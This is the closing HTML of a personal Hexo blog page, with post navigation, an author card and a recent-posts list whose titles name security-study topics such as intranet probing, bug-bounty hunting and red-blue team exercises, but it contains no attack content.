href="/2023/04/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="汇编语言学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">汇编语言学习笔记</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/27/%E5%8D%9A%E5%AE%A2/%E5%A6%82%E4%BD%95%E5%86%99%E5%8D%9A%E5%AE%A2/" title="如何写博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">如何写博客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HVVL404</div><div class="author-info__description">欢迎来到我的博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/" title="65-内网安全-域环境&amp;工作组&amp;局域网探针方案">65-内网安全-域环境&amp;工作组&amp;局域网探针方案</a><time datetime="2023-05-24T14:20:01.894Z" title="发表于 2023-05-24 22:20:01">2023-05-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/" title="88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统">88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</a><time datetime="2023-05-23T15:27:29.466Z" title="发表于 2023-05-23 23:27:29">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/" title="86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化">86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</a><time datetime="2023-05-23T15:17:30.681Z" title="发表于 2023-05-23 23:17:30">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" title="82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报">82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</a><time datetime="2023-05-23T15:15:21.170Z" title="发表于 2023-05-23 23:15:21">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/" title="81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库">81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</a><time datetime="2023-05-23T15:11:59.107Z" title="发表于 2023-05-23 23:11:59">2023-05-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/bg.png')"><div id="footer-wrap"><div class="copyright">&copy;2023.4.27 - 2023 By HVVL404</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="http://blog.hvvl404.fun">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
